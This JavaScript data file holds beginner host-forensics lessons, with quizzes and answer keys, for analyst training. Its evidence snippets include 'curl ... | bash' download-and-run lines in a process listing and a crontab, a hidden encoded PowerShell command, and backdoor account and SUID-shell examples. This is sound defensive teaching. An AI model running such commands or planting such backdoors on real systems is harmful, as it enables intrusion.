// Host basics lessons: teach first, then practise.
//
// Lesson format (see README "Lessons"):
//   skill      skill id this lesson teaches
//   title      heading
//   goal       one-line learning goal
//   sections   3–6 compact sections: { id, heading, body: [paragraphs], points?: [bullets],
//              evidence?: { label, text } }. Text may use `code` and **bold**.
//              Section ids are link targets: misconceptions link to '<skill>#<section id>'.
//   worked     fully worked examples: { id, title, artifactLabel, artifact, question,
//              steps: [analyst reasoning, one step per entry], conclusion }
//   faded      partly solved examples: { id, title, artifactLabel, artifact, question,
//              given: [steps already done], todo: [{ prompt, type: 'mc'|'text', choices?,
//              answer?, accept?, explanation }] } where the student completes the todo steps.
//
// IPs use documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) or RFC 1918.

export const HOST_LESSONS = [
  // ===================================================================== processes
  {
    skill: 'host-processes',
    title: 'OS fundamentals & processes',
    goal: 'Read a process tree and spot the parent/child relationships that give attackers away.',
    sections: [
      {
        id: 'program-process',
        heading: 'Programs vs processes',
        body: [
          'A **program** is a file on disk, such as `C:\\Windows\\System32\\notepad.exe` or `/usr/bin/python3`. A **process** is one running copy of a program: code loaded into memory, with its own process ID (PID), owner (user account), memory and open files or connections.',
          'One program can run as many processes (every browser tab helper is one). A process can even keep running after its file is deleted, a trick malware uses.',
        ],
        points: ['File questions: path, hash, signer, when it appeared.', 'Process questions: parent, command line, user, network activity.'],
      },
      {
        id: 'pid-ppid',
        heading: 'PIDs and parents (PPID)',
        body: [
          'Every process has a **PID** (its own ID) and a **PPID**: the PID of the parent process that started it. Following PPIDs upwards gives you the chain of who launched what.',
          'On Linux the first user-space process, init/systemd, is PID 1. Orphaned processes are re-parented to it (or to a designated subreaper).',
        ],
        evidence: {
          label: 'ps -ef (trimmed)',
          text: 'UID    PID  PPID  CMD\nroot     1     0  /sbin/init\nroot   812     1  /usr/sbin/sshd -D\ndev   4432  4431  -bash\ndev   4519  4432  python3 /tmp/.x/m.py   <- parent is PID 4432 (-bash)',
        },
      },
      {
        id: 'trees',
        heading: 'What normal looks like on Windows',
        body: [
          'Knowing the normal tree makes the abnormal jump out. Core system processes always have the same parents and live in `C:\\Windows\\System32`.',
        ],
        evidence: {
          label: 'Normal Windows process tree',
          text: 'wininit.exe\n├─ services.exe        (Service Control Manager)\n│   └─ svchost.exe     (many copies: that is normal)\n└─ lsass.exe           (credentials: a target for dumping)\nexplorer.exe            (the user\'s desktop shell)\n└─ chrome.exe, WINWORD.EXE, ... (user programs)',
        },
        points: ['svchost.exe: parent is services.exe.', 'lsass.exe: exactly one, parent wininit.exe.', 'User apps: usually started by explorer.exe.'],
      },
      {
        id: 'red-flags',
        heading: 'Red flags in a process tree',
        body: [
          'Attackers need processes too, and they leave shapes you can learn to recognise. Judge context rather than names: PowerShell, cmd and bash are normal admin tools, used all day by IT and management agents.',
        ],
        points: [
          '**Wrong parent:** Office, a PDF reader or a web server (apache2, w3wp.exe) spawning a shell.',
          '**Wrong place:** a "system" name running from `C:\\Users\\Public`, `AppData` or `/tmp`.',
          '**Look-alike names:** `svch0st.exe`, `lsass .exe`, `scvhost.exe`.',
          '**Suspicious command lines:** `-EncodedCommand`, hidden windows, download-and-run (`IEX`, `curl ... | bash`).',
        ],
      },
    ],
    worked: [
      {
        id: 'hp-w1',
        title: 'Macro to PowerShell',
        artifactLabel: 'EDR process tree: user laptop',
        artifact:
          'explorer.exe (PID 3120)\n└─ WINWORD.EXE (PID 5544)  "C:\\Users\\mia\\Downloads\\Invoice_0912.docm"\n   └─ cmd.exe (PID 6012)  /c powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...\n      └─ powershell.exe (PID 6090)\n         └─ connects to 203.0.113.66:443',
        question: 'Is this activity suspicious, and why?',
        steps: [
          'Start at the top: explorer.exe starting WINWORD.EXE is normal. Mia opened a document.',
          'The document is a `.docm` (macro-enabled) file from Downloads, which is a common phishing delivery method.',
          'WINWORD.EXE is the parent (PPID 5544) of cmd.exe. Word has no everyday reason to start a command shell, so this is the key anomaly.',
          'cmd.exe runs PowerShell with `-w hidden` (no window) and `-enc` (Base64-encoded command). Both are ways to hide what runs.',
          'The PowerShell process then connects out to an external IP on 443, which fits a download or command-and-control check-in.',
        ],
        conclusion:
          'Malicious macro pattern: Office → shell → hidden, encoded PowerShell → outbound connection. Isolate the laptop, collect the document and decode the command.',
      },
    ],
    faded: [
      {
        id: 'hp-f1',
        title: 'Web server spawning a shell',
        artifactLabel: 'ps -ef on a Linux web server',
        artifact:
          'UID       PID   PPID  CMD\nroot      640      1  /usr/sbin/apache2 -k start\nwww-data 2211    640  /usr/sbin/apache2 -k start\nwww-data 7730   2211  sh -c curl -s http://198.51.100.14/x.sh | bash\nwww-data 7733   7730  bash',
        question: 'Who started the shell, and what does it mean?',
        given: [
          'Find the suspicious line: PID 7730 runs `sh -c curl ... | bash`, which downloads a script and pipes it straight into bash.',
          'Its PPID is 2211, so look for the process whose PID is 2211.',
        ],
        todo: [
          {
            prompt: 'Which program is PID 2211, the parent of the shell?',
            type: 'mc',
            choices: ['apache2 (the web server, running as www-data)', 'bash', 'init/systemd', 'curl'],
            answer: 'apache2 (the web server, running as www-data)',
            explanation: 'PID 2211 is an apache2 worker running as www-data. The shell\'s parent is the web server itself.',
          },
          {
            prompt: 'So what is the most likely explanation?',
            type: 'mc',
            choices: [
              'Remote code execution or a web shell: the web server was made to run attacker commands',
              'Normal Apache log rotation',
              'An administrator updating packages',
            ],
            answer: 'Remote code execution or a web shell: the web server was made to run attacker commands',
            explanation:
              'Web servers serve pages; they should not spawn shells that download and run scripts. This is the Linux equivalent of Word spawning PowerShell.',
          },
        ],
      },
    ],
  },

  // ===================================================================== users
  {
    skill: 'host-users',
    title: 'Users, groups & permissions',
    goal: 'Read Linux permissions, recognise privileged accounts and apply least privilege.',
    sections: [
      {
        id: 'linux-perms',
        heading: 'Reading Linux permissions',
        body: [
          'In `ls -l`, the first character is the type (`-` file, `d` directory, `l` link). The next nine characters are three rwx blocks: **owner**, **group**, **others**.',
          'Each block becomes one octal digit: r = 4, w = 2, x = 1, added up.',
        ],
        evidence: {
          label: 'ls -l',
          text: '-rwxr-x---  1 root admins  8120  deploy.sh\n ^^^ owner: rwx = 4+2+1 = 7\n    ^^^ group: r-x = 4+0+1 = 5\n       ^^^ others: --- = 0      -> 750',
        },
      },
      {
        id: 'root-uid0',
        heading: 'root and UID 0',
        body: [
          'On Linux, power comes from the **user ID**, not the name. UID 0 is the superuser, normally called root. Any account with UID 0 in `/etc/passwd` has full root power, whatever it is called.',
          '`sudo` lets permitted users run commands as root, and each use is logged in auth.log (Debian/Ubuntu) or /var/log/secure (RHEL).',
        ],
        evidence: { label: '/etc/passwd (name:x:UID:GID:comment:home:shell)', text: 'root:x:0:0:root:/root:/bin/bash\nalice:x:1001:1001:Alice:/home/alice:/bin/bash\nbackup2:x:0:0::/home/backup2:/bin/bash   <- UID 0 = a second root' },
      },
      {
        id: 'special-bits',
        heading: 'SUID and the sticky bit',
        body: [
          '**SUID** is an `s` in the owner-execute position (`-rwsr-xr-x`). The program runs with the file owner\'s privileges, often root, whoever starts it. `/usr/bin/passwd` legitimately needs it; an unexpected SUID-root binary is a privilege-escalation path.',
          'The **sticky bit** is a `t` in the others-execute position (`drwxrwxrwt /tmp`). In a shared directory, only a file\'s owner (or root) can delete or rename it.',
        ],
      },
      {
        id: 'windows-admin',
        heading: 'Windows admin rights and UAC',
        body: [
          'High-value groups include local **Administrators**, **Domain Admins** and **Enterprise Admins**. New members are worth verifying (events 4728/4732/4756).',
          '**UAC** runs administrators with a standard-user token until they approve an elevation prompt. It reduces accidents but is not a security boundary: users click Yes, and bypasses exist.',
        ],
      },
      {
        id: 'least-privilege',
        heading: 'Least privilege',
        body: ['Give each account only the access it needs, for only as long as it needs it. A help-desk account in Domain Admins "just in case" turns one phished password into a domain-wide compromise.'],
      },
    ],
    worked: [
      {
        id: 'hu-w1',
        title: 'A hidden second root',
        artifactLabel: '/etc/passwd on a web server',
        artifact:
          'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nalice:x:1001:1001:Alice:/home/alice:/bin/bash\nsysupd:x:0:0::/var/tmp/.s:/bin/bash',
        question: 'Is anything wrong with these accounts?',
        steps: [
          'Read the fields: name : password placeholder : UID : GID : comment : home : shell.',
          'The `x` in field two is normal. It means the hash lives in /etc/shadow.',
          'Service accounts like daemon and www-data have low UIDs and a `nologin` shell, which is normal.',
          'sysupd has **UID 0**, which makes it a second root account.',
          'Its home directory is a hidden folder in /var/tmp and it has a real login shell. Neither fits a legitimate system account.',
        ],
        conclusion: 'sysupd is a backdoor root account. Escalate, check auth.log for its logins, and find out how it was added.',
      },
    ],
    faded: [
      {
        id: 'hu-f1',
        title: 'An odd SUID binary',
        artifactLabel: 'find / -perm -4000 (trimmed)',
        artifact: '-rwsr-xr-x 1 root root  68208 /usr/bin/passwd\n-rwsr-xr-x 1 root root 166056 /usr/bin/sudo\n-rwsr-xr-x 1 root root 125688 /var/tmp/.cache/bash',
        question: 'Which file is a concern and why?',
        given: ['The command lists files with the SUID bit set (the `s` in `rws`).', 'passwd and sudo are standard SUID programs that need root to do their job.'],
        todo: [
          {
            prompt: 'What does the "s" mean for /var/tmp/.cache/bash?',
            type: 'mc',
            choices: [
              'Anyone who runs it gets a bash shell with root\'s privileges',
              'It is the sticky bit, so only root can delete it',
              'The file is digitally signed',
            ],
            answer: 'Anyone who runs it gets a bash shell with root\'s privileges',
            explanation: 'SUID on a root-owned shell means any user can get root. A copy of bash hidden in /var/tmp is a classic backdoor.',
          },
          {
            prompt: 'What is the numeric (octal) form of the basic permissions rwxr-xr-x on these files? (three digits)',
            type: 'text',
            accept: ['755', '0755'],
            explanation: 'rwx = 7, r-x = 5, r-x = 5, so 755. With SUID it is written 4755.',
          },
        ],
      },
    ],
  },

  // ===================================================================== filesystem
  {
    skill: 'host-filesystem',
    title: 'File system & common paths',
    goal: 'Know where system files, user data, secrets and attacker favourites live on Windows and Linux.',
    sections: [
      {
        id: 'linux-layout',
        heading: 'Linux layout',
        body: ['Everything hangs off `/`. The directories an analyst visits most:'],
        points: [
          '`/etc`: system-wide configuration (passwd, shadow, crontab, ssh).',
          '`/home/<user>` and `/root`: user files. `/var/log`: logs.',
          '`/tmp`, `/var/tmp`, `/dev/shm`: writable by everyone, which makes them favourite drop zones.',
          'Names starting with a dot are hidden from plain `ls`; use `ls -la`.',
        ],
      },
      {
        id: 'secrets',
        heading: 'Where secrets live',
        body: [
          '`/etc/passwd` lists accounts and is readable by everyone. The `x` means "see /etc/shadow". `/etc/shadow` holds the password hashes and is readable only by root.',
          'Other goldmines: `~/.bash_history` (commands typed), `~/.ssh/` (private keys and authorized_keys), browser profiles, and on Windows the SAM and the memory of lsass.exe.',
        ],
      },
      {
        id: 'windows-layout',
        heading: 'Windows layout',
        body: ['Key folders on the system drive:'],
        points: [
          '`C:\\Windows\\System32`: core system programs (cmd.exe, svchost.exe).',
          '`C:\\Program Files` and `C:\\Program Files (x86)`: installed applications.',
          '`C:\\Users\\<user>\\AppData\\Roaming` and `\\Local\\Temp`: per-user app data and temp files.',
          '`...\\Start Menu\\Programs\\Startup`: anything here runs at that user\'s logon.',
        ],
      },
      {
        id: 'writable',
        heading: 'Writable folders and misleading names',
        body: [
          'Standard users **cannot** write to System32 or Program Files. They **can** write to their own profile (AppData, Temp, Downloads), to `C:\\Users\\Public` and, by default, to `C:\\ProgramData`. Malware without admin rights lives in those places.',
          'Names prove nothing: an attacker picks them. `svchost.exe` in `C:\\Users\\Public` or a "GoogleUpdate" task running a script from Temp is a red flag, not reassurance.',
        ],
      },
    ],
    worked: [
      {
        id: 'hf-w1',
        title: 'svchost.exe in the wrong place',
        artifactLabel: 'EDR alert',
        artifact:
          'Process:  svchost.exe\nPath:     C:\\Users\\Public\\Libraries\\svchost.exe\nParent:   explorer.exe\nSigner:   (unsigned)\nUser:     CORP\\t.nguyen',
        question: 'Is this the real Windows svchost.exe?',
        steps: [
          'The name matches a core Windows process, but names can be copied, so check the path.',
          'The real svchost.exe lives in `C:\\Windows\\System32`. This one is in `C:\\Users\\Public\\Libraries`, which any user can write to.',
          'The parent is explorer.exe; a real svchost.exe is started by services.exe.',
          'It is unsigned, while genuine Windows binaries carry Microsoft signatures.',
        ],
        conclusion: 'Masquerading malware using a system name. Isolate the host, collect the file, and check how it got there.',
      },
    ],
    faded: [
      {
        id: 'hf-f1',
        title: 'Something hidden in /tmp',
        artifactLabel: 'ls -la /tmp',
        artifact: 'drwxrwxrwt 12 root     root     4096 Sep 14 03:10 .\ndrwxr-xr-x 19 root     root     4096 Aug  2 11:04 ..\ndrwxr-xr-x  2 www-data www-data 4096 Sep 14 03:09 .x\n-rw-------  1 alice    alice     210 Sep 14 09:12 sess_81ac',
        question: 'What stands out, and why did plain `ls` miss it?',
        given: ['`-a` shows hidden entries (names starting with a dot).', '/tmp is world-writable with the sticky bit (`drwxrwxrwt`), which is normal.'],
        todo: [
          {
            prompt: 'Which entry deserves a closer look?',
            type: 'mc',
            choices: ['The hidden directory .x owned by www-data (the web server account)', 'The sess_81ac file owned by alice', 'The . entry owned by root'],
            answer: 'The hidden directory .x owned by www-data (the web server account)',
            explanation: 'A hidden directory created at 03:09 by the web server account fits an attacker dropping tools after exploiting the website.',
          },
        ],
      },
    ],
  },

  // ===================================================================== persistence
  {
    skill: 'host-persistence',
    title: 'Services & persistence basics',
    goal: 'Recognise the common ways attackers survive a reboot, and triage them without panicking.',
    sections: [
      {
        id: 'what-is',
        heading: 'What persistence is',
        body: [
          '**Persistence** keeps an attacker\'s access working across reboots, logoffs and password changes. It is one stage (tactic) of an attack, different from credential access (guessing or stealing passwords), lateral movement (hopping hosts) and exfiltration (taking data).',
        ],
      },
      {
        id: 'windows-autostart',
        heading: 'Windows auto-start locations',
        body: ['Anything that runs automatically can be abused:'],
        points: [
          '**Run keys:** `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (per user), `HKLM\\...\\Run` (all users).',
          '**Services:** System log **7045** "A service was installed". Security 4697 if auditing is enabled.',
          '**Scheduled tasks:** `schtasks /create`. Security **4698** "A scheduled task was created".',
          '**Startup folder:** shortcuts or scripts there run at logon.',
        ],
      },
      {
        id: 'linux-autostart',
        heading: 'Linux auto-start locations',
        body: ['Look where code gets executed automatically, not at logs or /proc:'],
        points: [
          '**cron:** `/etc/crontab`, `/etc/cron.d/`, user crontabs (`crontab -l`).',
          '**systemd units:** `/etc/systemd/system/*.service`.',
          '**Shell start-up files:** `~/.bashrc`, `~/.profile` run when a user starts a shell.',
          '**SSH keys:** a line added to `~/.ssh/authorized_keys` grants password-less logins.',
        ],
        evidence: { label: 'A malicious crontab line', text: '*/10 * * * * curl -s http://203.0.113.50/u.sh | bash' },
      },
      {
        id: 'triage',
        heading: 'Triage: suspicious or expected?',
        body: ['Legitimate software creates services and tasks all the time. Ask:'],
        points: [
          'Is the binary in a user-writable folder (Public, Temp, AppData, /tmp)?',
          'Does it run with high privileges (LocalSystem, root) at every boot?',
          'Is the name random or imitating a vendor ("GoogleUpdateTaskCore" running PowerShell)?',
          'Is it signed, and does it match an approved change?',
        ],
      },
    ],
    worked: [
      {
        id: 'hs-w1',
        title: 'A suspicious service install',
        artifactLabel: 'System log, Event ID 7045',
        artifact:
          'A service was installed in the system.\nService Name:       WinDefendUpdater\nService File Name:  C:\\Users\\Public\\wdupd.exe\nService Type:       user mode service\nService Start Type: auto start\nService Account:    LocalSystem',
        question: 'Expected change or persistence?',
        steps: [
          '7045 by itself only says a service was installed, and installers do this legitimately.',
          'The name imitates Windows Defender, but Defender\'s real service is not installed like this.',
          'The binary is in `C:\\Users\\Public`, which any user can write to. Real services live in System32 or Program Files.',
          'It auto-starts at every boot as **LocalSystem**, the highest local privilege.',
        ],
        conclusion: 'Likely malicious persistence with SYSTEM rights. Collect wdupd.exe, check who installed it (look for 4697 and logons around that time) and contain the host.',
      },
    ],
    faded: [
      {
        id: 'hs-f1',
        title: 'A cron job',
        artifactLabel: 'crontab -l for www-data',
        artifact: '# m h dom mon dow command\n*/10 * * * * curl -s http://203.0.113.50/u.sh | bash',
        question: 'What does this do and what is it?',
        given: ['The five time fields are minute, hour, day of month, month, day of week.', '`*/10` in the minute field means "every 10 minutes"; the other stars mean "every".'],
        todo: [
          {
            prompt: 'What does the command part do?',
            type: 'mc',
            choices: [
              'Downloads a script from an external IP and runs it with bash',
              'Rotates the web server logs',
              'Checks that the website is up',
            ],
            answer: 'Downloads a script from an external IP and runs it with bash',
            explanation: '`curl -s URL | bash` fetches whatever the server returns and executes it immediately, every 10 minutes.',
          },
          {
            prompt: 'Which Linux scheduler provides this persistence? (one word)',
            type: 'text',
            accept: ['cron', 'crontab', 'crond'],
            explanation: 'cron runs it forever, even after reboots. It is a very common persistence method on compromised web servers.',
          },
        ],
      },
    ],
  },

  // ===================================================================== host logs
  {
    skill: 'host-logs',
    title: 'Host logs (Windows & Linux)',
    goal: 'Know the key Windows event IDs and Linux auth lines, and read them as a story.',
    sections: [
      {
        id: 'windows-security',
        heading: 'Key Windows Security event IDs',
        body: ['Learn these by heart. They carry most host investigations:'],
        points: [
          '**4624** logon success. **4625** logon failure. **4634** logoff.',
          '**4672** special (admin-level) privileges assigned to a new logon.',
          '**4688** a new process was created (with command line if enabled).',
          '**4720** user created. **4728 / 4732** member added to a global / local security group.',
          '**1102** the Security audit log was cleared.',
        ],
      },
      {
        id: 'logon-types',
        heading: 'Logon types',
        body: ['4624 and 4625 include a Logon Type that tells you **how** someone logged on:'],
        points: ['**2** interactive (at the keyboard).', '**3** network (for example SMB file share access).', '**10** RemoteInteractive (an RDP desktop session).', '**5** service. **4** batch (scheduled task).', 'RDP catch: with **Network Level Authentication** (the default) the password is checked over the network before any session exists, so **failed** RDP logons log 4625 **type 3**, not 10. The successful session logs 4624 type 10, and event **1149** (TerminalServices-RemoteConnectionManager) records the RDP authentication.'],
      },
      {
        id: 'linux-auth',
        heading: 'Linux authentication logs',
        body: ['On Debian/Ubuntu, SSH logins and sudo use go to `/var/log/auth.log` (RHEL: `/var/log/secure`).'],
        evidence: {
          label: 'auth.log',
          text: 'sshd[2210]: Failed password for root from 198.51.100.23 port 51202 ssh2\nsshd[2214]: Failed password for invalid user admin from 198.51.100.23 port 51230 ssh2\nsshd[2231]: Accepted password for deploy from 198.51.100.23 port 51388 ssh2\nsudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash',
        },
      },
      {
        id: 'patterns',
        heading: 'Patterns that matter',
        body: [
          '**Brute force that worked:** many failures (4625 / "Failed password"), then a success (4624 / "Accepted") from the same source. The success is what turns noise into an incident.',
          '**Spraying:** a few attempts each against many usernames from one source. That is not a forgetful user.',
          '**Covering tracks:** 1102 (Security log cleared) or 104 (System log cleared) is rarely legitimate, especially right after account changes.',
        ],
      },
    ],
    worked: [
      {
        id: 'hl-w1',
        title: 'RDP brute force that succeeded',
        artifactLabel: 'Security log on an internet-facing server',
        artifact:
          'FW-EDGE  ALLOW TCP 203.0.113.45 -> 10.10.20.15:3389\n03:14:02  4625  Account: administrator  Logon Type: 3  Source: 203.0.113.45  (NtLmSsp)\n03:14:04  4625  Account: administrator  Logon Type: 3  Source: 203.0.113.45  (NtLmSsp)\n   ... 180 more 4625 events in 9 minutes ...\n03:23:40  1149  RDP user authentication succeeded  User: administrator  Source: 203.0.113.45\n03:23:41  4624  Account: administrator  Logon Type: 10  Source: 203.0.113.45\n03:23:41  4672  Special privileges assigned  Account: administrator',
        question: 'What happened?',
        steps: [
          '4625 = failed logon. Over 180 failures in 9 minutes from one external IP is automated guessing.',
          'The firewall shows 3389 open to the internet. The failures are Logon Type 3 because Network Level Authentication checks the password before an RDP session exists; that is normal for RDP brute force.',
          'At 03:23:40 event **1149** records a successful RDP authentication, then **4624 Logon Type 10** (RemoteInteractive = an RDP desktop session) for the same account, from the same IP.',
          '4672 right after means the session got admin-level privileges.',
        ],
        conclusion: 'A successful RDP brute force against the administrator account. Treat it as a compromise: contain the server, reset credentials and review what happened after 03:23.',
      },
    ],
    faded: [
      {
        id: 'hl-f1',
        title: 'SSH: noise or success?',
        artifactLabel: '/var/log/auth.log',
        artifact:
          'Sep 14 02:01:10 web1 sshd[3301]: Failed password for invalid user test from 198.51.100.61 port 40112 ssh2\nSep 14 02:01:13 web1 sshd[3305]: Failed password for invalid user oracle from 198.51.100.61 port 40130 ssh2\nSep 14 02:01:19 web1 sshd[3309]: Failed password for deploy from 198.51.100.61 port 40158 ssh2\nSep 14 02:01:24 web1 sshd[3312]: Accepted password for deploy from 198.51.100.61 port 40170 ssh2',
        question: 'Did the attacker get in?',
        given: ['"invalid user" means the username does not exist on this server. The attacker is guessing names.', 'The first three lines are failures from 198.51.100.61.'],
        todo: [
          {
            prompt: 'Which account, if any, logged in successfully?',
            type: 'mc',
            choices: ['deploy', 'test', 'oracle', 'None, all attempts failed'],
            answer: 'deploy',
            explanation: '"Accepted password for deploy" is a successful login, from the same IP that was guessing.',
          },
          {
            prompt: 'What is the Windows Security event ID with the same meaning as that "Accepted" line?',
            type: 'text',
            accept: ['4624'],
            explanation: '4624 is a successful logon; 4625 is a failure.',
          },
        ],
      },
    ],
  },
];
